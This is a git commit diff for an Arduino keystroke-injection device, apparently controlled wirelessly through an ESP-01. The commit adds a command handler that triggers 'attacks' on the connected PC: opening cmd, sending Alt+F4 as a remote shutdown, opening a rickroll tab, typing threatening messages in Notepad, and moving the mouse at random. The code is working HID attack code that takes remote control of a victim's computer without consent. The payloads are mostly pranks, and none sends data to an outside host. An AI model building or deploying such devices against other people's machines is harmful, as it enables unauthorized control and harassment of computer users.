920ba6fcef52cb870b017d6b62582f155fc807b5
Shourya Srivastava <ssgamingshourya@gmail.com>
2024-02-22 12:11:34 +0530

    added moveMouse

--- include/WirelessAttacks.h
+++ include/WirelessAttacks.h
@@ -1,14 +1,44 @@
 #include <Arduino.h>
 #include <Keyboard.h>
+#include <Mouse.h>
+#include <SoftwareSerial.h>
 
 class Wireless_Attacks
 {
+    private:
+    // Just Presses Enter(im lazy to write 2 lines of code everytime i want to press enter)
+    void PressEnter();
+
+
+
     public:
+    // Initiates Everything
     void init();
+
+    // Attacks start
+
+    // test attack which opens cmd 
     void TEST_1();
+
+    // remotely shut down the pc
     void RemoteShutdown();
-    void CloseApplication();
-    void RickRoll();
-    void CreepyMessage();
+
+    // close the application
+    void CloseApplication(); 
+
+    // open new tab with rickroll
+    void RickRoll(); 
+
+    // print a creepy message on notepad
+    void CreepyMessage(); 
+
+    // move you mouse to random location like 50 times
+    void MoveMouseToRandomLocations();
+
+
+    // Attacks End
+    
+    // Handles The Signals From the Esp01 and execute the HID Attacks
+    void Handle();
     
 };
--- src/WirelessAttacks.cpp
+++ src/WirelessAttacks.cpp
@@ -1,9 +1,22 @@
 #include "WirelessAttacks.h"
+
+SoftwareSerial WebpageSerial(10, 9);
+
+
+void Wireless_Attacks::PressEnter()
+{
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+}
+
+
 void Wireless_Attacks::init()
 {
     Serial.begin(9600);
     Keyboard.begin();
+    Mouse.begin();
 }
+
 void Wireless_Attacks::TEST_1() {
     Keyboard.press(KEY_LEFT_GUI);
     delay(100);
@@ -13,18 +26,15 @@ void Wireless_Attacks::TEST_1() {
     delay(100); 
     Keyboard.print("cmd");
     delay(100); 
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(1000);
     Keyboard.print("color a");
     delay(100);
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(1000);
     Keyboard.print("dir/s");
     delay(100);
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(1000);
     Keyboard.press(KEY_F11);
     delay(100);
@@ -37,13 +47,13 @@ void Wireless_Attacks::RemoteShutdown()
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('d');
     Keyboard.releaseAll();
-    delay(2);
+    delay(200);
     Keyboard.press(KEY_LEFT_ALT);
     Keyboard.press(KEY_F4);
     delay(3);
     Keyboard.releaseAll();
-    Keyboard.press(KEY_RETURN);
-    Keyboard.releaseAll();
+    // Keyboard.press(KEY_RETURN);
+    // Keyboard.releaseAll();
 }
 
 void Wireless_Attacks::CloseApplication()
@@ -55,6 +65,13 @@ void Wireless_Attacks::CloseApplication()
 
 void Wireless_Attacks::RickRoll()
 {
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press('t');
+    Keyboard.releaseAll();
+    delay(600);
+    Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    delay(10);
+    PressEnter();
 
 }
 
@@ -68,37 +85,57 @@ void Wireless_Attacks::CreepyMessage()
     delay(100); 
     Keyboard.print("cmd");
     delay(100); 
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(500);
     Keyboard.print("start notepad");
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(400);
     Keyboard.print("THEY ARE LOOKING AT YOU");
     Keyboard.press(KEY_RETURN);
     Keyboard.release(KEY_RETURN);
     delay(2000);
     Keyboard.print("YOU ARE NOT SAFE!");
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(2000);
     Keyboard.print("THEY ARE AFTER YOUR SOUL.......");
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(2000);
     Keyboard.print("YOU NEED TO HIDE!");
-    Keyboard.press(KEY_RETURN);
-    Keyboard.release(KEY_RETURN);
+    PressEnter();
     delay(2000);
     Keyboard.print("THEY ARE COMMING FOR YOU");
     delay(4000);
     for(int i = 0; i < 30; i++)
     {
-        Keyboard.press(KEY_RETURN);
-        Keyboard.release(KEY_RETURN);
+        PressEnter();
         Keyboard.print("HIDE.....");
         delay(1000);
         
+    }
+}
+
+void Wireless_Attacks::MoveMouseToRandomLocations()
+{
+    for (int i = 0; i < 100; i++)
+    {
+        int MouseX = random(0, 1920);
+        int MouseY = random(0, 1080);
+        Mouse.move(MouseX, MouseY);
+        delay(100);
+    }
+    
+}
+
+void Wireless_Attacks::Handle()
+{
+    if(WebpageSerial.available())
+    {
+        char command = WebpageSerial.read();
+        if(command == '1'){Serial.println("Starting Test Attack"); TEST_1();}
+        else if(command == '2'){Serial.println("Launching Remote Shutdown"); RemoteShutdown();}
+        else if(command == '3'){Serial.println("Closing Application"); CloseApplication();}
+        else if(command == '4') {Serial.println("Sending Creepy Message Attack"); CreepyMessage();}
+        else if(command == '5'){Serial.println("Opening RickRoll"); RickRoll();}
+        else if(command == '6'){Serial.println("Moving MOuse"); MoveMouseToRandomLocations();}
     }
 }
